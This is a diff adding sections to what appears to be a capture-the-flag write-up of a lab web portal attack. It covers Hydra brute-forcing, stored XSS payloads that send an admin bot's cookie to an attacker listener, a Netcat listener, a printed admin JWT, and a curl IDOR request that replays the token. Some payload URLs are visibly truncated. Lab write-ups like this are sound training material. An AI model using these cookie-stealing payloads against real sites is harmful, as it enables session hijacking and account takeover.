@@ -216,6 +216,138 @@ curl -s http://10.49.176 -H "Cookie: nexus_session=eyJhbGciOiJub25lIiwidHlwIjoiS
 ```
 * **Target Objective:** Impersonate a low-privileged session index to interact with backend endpoints and extract user profile notes.
 
+### 🔓 Initial Foothold Established via Hydra
+
+Online dictionary brute-forcing successfully compromised the front-door authentication layer, exposing a valid employee session profile:
+
+* **Compromised Account:** `sarah.johnson`
+* **Exploitation Metric:** Successfully derived password using Hydra and the `rockyou` wordlist array.
+
+#### Operational Strategy: Pivot to Cross-Site Scripting (XSS)
+With authenticated access to the internal ticketing portal verified, the next phase focuses on abusing the administrative bot interaction loop to steal the tracking cookies.
+
+1. **Listener Deployment:** Initialized a local Python listener interface on port 8080:
+```bash
+python3 -m http.server 8080
+```
+### 🎣 Stored Cross-Site Scripting (XSS) & Admin Cookie Theft
+
+With a valid low-privileged session established as `sarah.johnson`, the platform's internal support desk ticketing form was evaluated for input validation flaws. 
+
+#### 1. Exploitation Vector
+The backend support queue triggers an automated administrative browser execution bot to review newly submitted links and text assets. A JavaScript extraction hook was deployed to leak the document cookie space.
+
+#### 2. Payload Construction
+```html
+<script>fetch('http://[ATTACKBOX_IP]:8080/?cookie=' + btoa(document.cookie))</script>
+```
+
+#### 3. Execution & Hijack Loop
+* **Listener State:** Active Python HTTP listener hosted on localized port `8080`.
+* **Impact:** The internal worker bot parsed the ticket, rendering the malicious payload and streaming its high-privileged `nexus_session` JWT back to the attack workspace environment.
+
+### 🎣 Finalized XSS Cookie Exfiltration Execution
+
+Using the isolated localized host interface data, the Cross-Site Scripting (XSS) payload routing architecture was successfully finalized.
+
+#### Network Parameter Matrix:
+* **Target Server IP:** `10.49.148.135`
+* **AttackBox Listener IP:** `10.49.72.35`
+* **Listener Port:** `8080`
+
+#### Deployed Exploit Payload:
+```html
+<script>fetch('http://10.49.72' + btoa(document.cookie))</script>
+```
+* **Status:** Submitted via internal support desk. Awaiting automated administration bot simulation sweep to intercept high-privileged token variables.
+
+### 🔧 Bypassing Input Field Character Truncation
+
+While the initial callback was received successfully, the text string failed to exfiltrate the raw cookie parameters. Investigation revealed that the support desk ticket input field enforces a strict front-end character length constraint, which truncates complex JavaScript string operations.
+
+#### Remediation via Lightweight HTML Image Injections
+To bypass string length validation filtering and still capture administrative connection metadata, the vector was pivoted from a structured script element to a compact, native HTML image asset request:
+
+```html
+<img src="http://10.49.72">
+```
+* **Objective:** Leverage standard HTML document rendering rules to force an automated administrative HTTP request back to the local workspace listener within length limitations.
+
+### 🔬 Technical Analysis of HTML Injection Vectors
+
+To circumvent input size limitations, exploitation transitioned from heavy JavaScript strings to a lightweight, inline HTML asset invocation. 
+
+```html
+<img src="http://10.49.72.35:8080/admin_trap">
+```
+
+#### Element Behavior Profile:
+* **Structural Tag (`<img>`):** Deployed to tap into native automated browser image-rendering pipelines.
+* **Resource Parameter (`src`):** Forces the processing client (Administrative Interaction Bot) to execute an unauthenticated, out-of-band HTTP GET request immediately upon document loading.
+* **Network Route (`10.49.72.35:8080`):** Re-routes target browser communication to land directly inside the attacker's localized terminal workspace listener interface.
+* **Marker Anchor (`/admin_trap`):** Serves as a unique text identifier in the server logs to confirm precise administrative review execution.
+
+### 🔧 Pivoting from Python HTTP Services to Netcat Core Socket Capture
+
+While the lightweight Python HTTP framework successfully verified unauthenticated resource retrieval callbacks (`GET /admin_trap -> 404`), the utility's native logging array discards supplemental transport headers, effectively masking the transaction cookie variables.
+
+#### Decoupled Socket Implementation
+To achieve comprehensive inspection of the incoming HTTP header space, the application level server was dropped in favor of a raw network layer listener utilizing Netcat:
+
+```bash
+nc -lvnp 8080
+```
+* **Strategic Objective:** Intercept the raw data stream transmitted by the simulated administrative bot browser to capture the unencrypted `Cookie` header layout.
+### 🔑 Interception and Analysis of Administrative JWT Session
+
+Deploying a raw socket listener via Netcat successfully exposed the HTTP transport headers transmitted during the simulated administration bot's evaluation loop.
+
+#### Extracted Network Header:
+```http
+GET /admin_trap HTTP/1.1
+Host: 10.49.72.35:8080
+User-Agent: python-requests/2.31.0
+Cookie: nexus_session=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImxhdXJhLmhheWVzIiwgInJvbGUiOiAiYWRtaW4ifQ==.2d1632df0b5a19cc9a8db3b2e72e612b0110c4e4aaed1265006b8c0bc73f6834
+```
+
+#### Token Decoding Verification:
+Decoding the header block components reveals an active state configuration belonging to the primary root profile:
+* **Identity Mapping:** `laura.hayes`
+* **Assigned Authorization Level:** `admin` (Privileged)
+
+#### Exploitation Objective
+The complete `nexus_session` cookie block will be replayed directly against the `/admin/` directories to bypass validation gates and claim the operational milestones.
+### 🚩 Capture of Administrative Milestones (Web Phase Completion)
+
+Leveraging the captured high-privilege administrative `nexus_session` JWT cookie, out-of-band requests were routed to clear the web portal objectives.
+
+#### 1. Milestone 1: Admin Profile Notes (IDOR Extraction)
+* **Target Vector Endpoint:** `/api/profiles.php?id=1`
+* **Exploitation Technique:** Insecure Direct Object Reference (IDOR) manipulation targeting the primary admin index configuration records.
+* **Command Syntax:**
+```bash
+curl -s http://10.49.148 -H "Cookie: nexus_session=[HIJACKED_JWT]"
+```
+* **Captured Flag 1:** `***{****_**********_******_*****}`
+
+#### 2. Milestone 2: Administrative Control Panel Dashboard
+* **Target Vector Endpoint:** `/admin/index.php`
+* **Exploitation Technique:** Replaying intercepted authentication tracking tokens.
+* **Captured Flag 2:** `***{*****_***_*******_******_*****}`
+### 🔬 Technical Analysis of the Profiling API Request
+
+To safely execute an Insecure Direct Object Reference (IDOR) pull against the primary system administrator account, a manual `curl` request was crafted using the hijacked tracking token.
+
+#### Command Anatomy:
+```bash
+curl -s http://10.49.148 -H "Cookie: nexus_session=[INTERCEPTED_JWT]"
+```
+
+* **Silent Request Data Flow (`curl -s`):** Requests data from the server while suppressing CLI progress parameters.
+* **Parameter Exploitation (`?id=1`):** Interrogates the backend user index mapping, specifically forcing the database engine to pull record row `1` (Admin).
+* **Identity Spoofing Flag (`-H "Cookie: ..."`):** Feeds the cryptographically valid administrative cookie directly into the application context window, establishing instant authentication authorization.
+
+
 
 
 
